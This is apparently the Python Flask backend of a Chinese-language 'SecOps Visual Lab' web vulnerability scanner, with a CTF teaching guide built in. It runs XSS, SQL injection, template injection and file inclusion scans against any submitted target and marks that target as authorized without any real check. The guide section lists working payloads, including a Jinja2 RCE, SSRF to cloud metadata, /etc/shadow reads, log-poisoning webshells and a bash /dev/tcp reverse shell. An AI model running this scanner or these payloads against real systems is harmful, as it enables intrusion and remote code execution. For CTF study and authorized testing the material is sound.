"""
SecOps Visual Lab - 后端 API 服务器
提供漏洞验证引擎的 REST API 接口
"""

import sys
import os
import json
import threading
import time
from datetime import datetime
from flask import Flask, request, jsonify, send_from_directory
from flask_cors import CORS

# 添加父级 secops 模块到路径
sys.path.insert(0, os.path.join(os.path.dirname(__file__), "..", ".."))
import secops_offense.attack_engine as attack_engine
import secops_offense.github_offense as github_offense

app = Flask(__name__, static_folder="../frontend", static_url_path="")
CORS(app)

# 全局状态
current_scan = {"status": "idle", "progress": [], "findings": [], "target": ""}


@app.route("/")
def index():
    return send_from_directory(app.static_folder, "index.html")


@app.route("/<path:path>")
def static_files(path):
    return send_from_directory(app.static_folder, path)


@app.route("/api/status")
def api_status():
    return jsonify({"status": "ok", "version": "1.0.0", "scan": current_scan})


@app.route("/api/authorize", methods=["POST"])
def api_authorize():
    data = request.json
    target = data.get("target", "")
    if not target:
        return jsonify({"error": "missing target"}), 400
    attack_engine._authorization_granted = True
    attack_engine._authorized_target = target
    return jsonify({"authorized": True, "target": target})


@app.route("/api/attack", methods=["POST"])
def api_attack():
    data = request.json
    target = data.get("target", "")
    modules = data.get("modules", ["xss", "sqli", "ssti", "lfi", "infoleak"])
    time_based = data.get("time_based", False)

    if not target:
        return jsonify({"error": "missing target"}), 400

    attack_engine._authorization_granted = True
    attack_engine._authorized_target = target

    current_scan["status"] = "running"
    current_scan["target"] = target
    current_scan["progress"] = []
    current_scan["findings"] = []

    def run_scan():
        try:
            from secops_offense.attack_engine.browser_engine import BrowserEngine

            engine = attack_engine.AttackEngine(target)

            # 自动检测 SPA: URL含# 或 urllib拿到的是空壳
            is_spa = "#" in target
            if not is_spa:
                engine._detect_spa()
                is_spa = engine._is_spa

            current_scan["progress"].append({"step": "spa_detect", "done": True, "is_spa": is_spa})

            if is_spa:
                # SPA 模式: 使用浏览器引擎
                browser = BrowserEngine(target)
                if browser.start():
                    page_info = browser.get_page_info()

                    if "xss" in modules:
                        current_scan["progress"].append({"step": "xss", "status": "running"})
                        try:
                            findings = browser.scan_xss()
                            engine.findings.extend(findings)
                            current_scan["progress"].append({"step": "xss", "status": "done", "count": len(findings)})
                        except Exception as e:
                            current_scan["progress"].append({"step": "xss", "status": "error", "error": str(e)})

                    if "infoleak" in modules:
                        current_scan["progress"].append({"step": "infoleak", "status": "running"})
                        try:
                            findings = browser.scan_infoleak()
                            engine.findings.extend(findings)
                            current_scan["progress"].append({"step": "infoleak", "status": "done", "count": len(findings)})
                        except Exception as e:
                            current_scan["progress"].append({"step": "infoleak", "status": "error", "error": str(e)})

                    # 动态攻击: API fuzz / 管理后台 / 认证绕过
                    current_scan["progress"].append({"step": "dynamic", "status": "running"})
                    try:
                        dynamic_findings = browser.scan_dynamic()
                        engine.findings.extend(dynamic_findings)
                        current_scan["progress"].append({"step": "dynamic", "status": "done", "count": len(dynamic_findings)})
                    except Exception as e:
                        current_scan["progress"].append({"step": "dynamic", "status": "error", "error": str(e)})

                    # API 端点发现
                    api_endpoints = browser.discover_api_endpoints()
                    if api_endpoints:
                        current_scan["progress"].append({"step": "api_discovery", "done": True, "count": len(api_endpoints), "endpoints": api_endpoints[:20]})

                    browser.stop()
                else:
                    current_scan["progress"].append({"step": "browser", "status": "error", "error": "浏览器引擎启动失败"})
            else:
                # 普通模式: 使用 urllib 检测器
                module_map = {
                    "xss": lambda: attack_engine.XSSDetector.test(target),
                    "sqli": lambda: attack_engine.SQLiDetector.test(target, time_based=time_based),
                    "ssti": lambda: attack_engine.SSTIDetector.test(target),
                    "lfi": lambda: attack_engine.LFIDetector.test(target),
                    "infoleak": lambda: attack_engine.InfoLeakDetector.test(target),
                }

                for mod_name in modules:
                    if mod_name not in module_map:
                        continue
                    current_scan["progress"].append({"step": mod_name, "status": "running"})
                    try:
                        findings = module_map[mod_name]()
                        engine.findings.extend(findings)
                        current_scan["progress"].append({
                            "step": mod_name, "status": "done",
                            "count": len(findings)
                        })
                    except Exception as e:
                        current_scan["progress"].append({
                            "step": mod_name, "status": "error",
                            "error": str(e)
                        })

            engine.start_time = datetime.now()
            engine.end_time = datetime.now()
            current_scan["findings"] = [f.to_dict() for f in engine.findings]
            current_scan["status"] = "done"
        except Exception as e:
            current_scan["status"] = "error"
            current_scan["error"] = str(e)

    thread = threading.Thread(target=run_scan, daemon=True)
    thread.start()
    return jsonify({"status": "started", "target": target, "modules": modules})


@app.route("/api/scan/progress")
def api_scan_progress():
    return jsonify(current_scan)


@app.route("/api/arsenal")
def api_arsenal():
    from secops_offense import arsenal
    snapshot = {}
    for cat, payloads in arsenal.PAYLOADS.items():
        snapshot[cat] = len(payloads)
    return jsonify({"categories": snapshot, "total": sum(snapshot.values())})


@app.route("/api/learn", methods=["POST"])
def api_learn():
    data = request.json or {}
    categories = data.get("categories")
    force = data.get("force", False)
    try:
        learned = github_offense.learn_from_github(
            categories=categories, force_refresh=force, verbose=False
        )
        merged = github_offense.merge_into_arsenal(learned)
        snapshot = {cat: len(p) for cat, p in merged.items()}
        return jsonify({"status": "ok", "categories": snapshot, "total": sum(snapshot.values())})
    except Exception as e:
        return jsonify({"error": str(e)}), 500


@app.route("/api/ctf/guide/<vuln_type>")
def api_ctf_guide(vuln_type):
    guides = {
        "xss": {
            "name": "XSS 跨站脚本攻击",
            "what": "攻击者在网页中注入恶意脚本，当其他用户访问时执行。",
            "how_to_find": [
                "找所有能输入并显示在页面上的地方 (搜索框/留言板/个人简介)",
                "输入 <script>alert(1)</script> 看是否弹窗",
                "如果被过滤，尝试 <img src=x onerror=alert(1)>",
                "检查是否有 CSP 头限制",
            ],
            "ctf_tips": [
                "反射型: payload 在 URL 参数中，需要诱导点击",
                "存储型: payload 保存在数据库，所有人访问都触发 (高危)",
                "DOM型: payload 不经过服务器，纯前端 JS 处理",
                "绕过技巧: 大小写混合/编码/事件处理器/标签闭合",
            ],
            "tools": ["Burp Suite", "XSStrike", "HackBar"],
            "severity": "high",
        },
        "sqli": {
            "name": "SQL 注入",
            "what": "用户输入被拼接到 SQL 语句中，攻击者可操纵数据库查询。",
            "how_to_find": [
                "在参数后加单引号 ' 看是否报错",
                "尝试 AND 1=1 (正常) vs AND 1=2 (异常) = 布尔盲注",
                "尝试 SLEEP(5) 看是否延迟 = 时间盲注",
                "用 UNION SELECT 探测列数",
            ],
            "ctf_tips": [
                "报错型: 直接从报错信息获取数据 (extractvalue/updatexml)",
                "布尔盲注: 逐字符判断 (SUBSTR+ASCII)",
                "时间盲注: IF+SUBSTR+SLEEP 组合",
                "WAF绕过: 空格用/**/代替,大小写混合,双写关键字",
            ],
            "tools": ["sqlmap", "Burp Suite Intruder", "HackBar"],
            "severity": "critical",
        },
        "ssti": {
            "name": "服务端模板注入",
            "what": "用户输入被当作模板引擎代码执行，可导致远程代码执行。",
            "how_to_find": [
                "输入 {{7*7}} 如果返回 49 = Jinja2/Twig",
                "输入 ${7*7} 如果返回 49 = FreeMarker/Velocity",
                "输入 <%= 7*7 %> 如果返回 49 = ERB/ASP",
            ],
            "ctf_tips": [
                "Jinja2 RCE: {{config.__class__.__init__.__globals__['os'].popen('id').read()}}",
                "Twig: {{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}",
                "探测: {{''.__class__.__mro__[2].__subclasses__()}}",
            ],
            "tools": ["tplmap", "Burp Suite", "手动测试"],
            "severity": "critical",
        },
        "ssrf": {
            "name": "服务端请求伪造",
            "what": "攻击者让服务器发起请求访问内部资源。",
            "how_to_find": [
                "找所有让你填 URL 的功能 (获取远程图片/URL预览/Webhook)",
                "填入 http://127.0.0.1 或 http://内网IP",
                "尝试 file:///etc/passwd 读取本地文件",
                "尝试 http://169.254.169.254 读取云元数据",
            ],
            "ctf_tips": [
                "内网探测: 逐步扫描 10.0.0.0/24 或 192.168.0.0/24",
                "协议利用: file:// gopher:// dict://",
                "绕过: 0x7f000001 (127.0.0.1的十六进制)",
                "DNS重绑定: 先解析到外网再重绑定到内网",
            ],
            "tools": ["Burp Suite", "curl", "SSRFmap"],
            "severity": "high",
        },
        "lfi": {
            "name": "本地文件包含",
            "what": "攻击者可以读取服务器上的任意文件。",
            "how_to_find": [
                "找 ?file= / ?page= / ?include= 类参数",
                "尝试 ../../../etc/passwd",
                "尝试 php://filter/convert.base64-encode/resource=index.php",
            ],
            "ctf_tips": [
                "Linux: /etc/passwd /etc/shadow /proc/self/environ",
                "Windows: c:\\windows\\win.ini c:\\boot.ini",
                "PHP伪协议: php://filter (读源码), php://input (执行代码)",
                "日志投毒: 往 User-Agent 写 webshell 然后包含日志文件",
            ],
            "tools": ["dirsearch", "Burp Suite", "手动测试"],
            "severity": "critical",
        },
        "xxe": {
            "name": "外部实体注入",
            "what": "XML 解析器处理了恶意外部实体，可读取文件或发起请求。",
            "how_to_find": [
                "找上传 XML 或接受 XML 输入的功能",
                "注入 <!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]>",
            ],
            "ctf_tips": [
                "读文件: SYSTEM 'file:///etc/passwd'",
                "SSRF: SYSTEM 'http://内网IP'",
                "Base64: SYSTEM 'php://filter/convert.base64-encode/resource=/etc/passwd'",
                "盲注: 通过外带数据 (DNS/HTTP) 提取",
            ],
            "tools": ["Burp Suite", "XXEinjector", "手动测试"],
            "severity": "critical",
        },
        "cmdi": {
            "name": "命令注入",
            "what": "用户输入被拼接到系统命令中执行。",
            "how_to_find": [
                "找 ping/IP 输入框，在后面加 ;id 或 |id",
                "找 DNS 查询/URL 访问等功能",
            ],
            "ctf_tips": [
                "分隔符: ; | || && ` $()",
                "绕过空格: ${IFS} %09 < > 重定向",
                "绕过过滤: ca$ti /bi?/ca? /usr/bin/b???/cat",
                "反弹shell: bash -i >& /dev/tcp/IP/PORT 0>&1",
            ],
            "tools": ["Burp Suite", "手动测试", "commix"],
            "severity": "critical",
        },
    }
    guide = guides.get(vuln_type)
    if not guide:
        return jsonify({"error": "unknown type"}), 404
    return jsonify(guide)


if __name__ == "__main__":
    import webbrowser
    port = 51234
    print(f"\n  SecOps Visual Lab starting on http://127.0.0.1:{port}")
    print(f"  Press Ctrl+C to stop\n")
    webbrowser.open(f"http://127.0.0.1:{port}")
    app.run(host="127.0.0.1", port=port, debug=False)
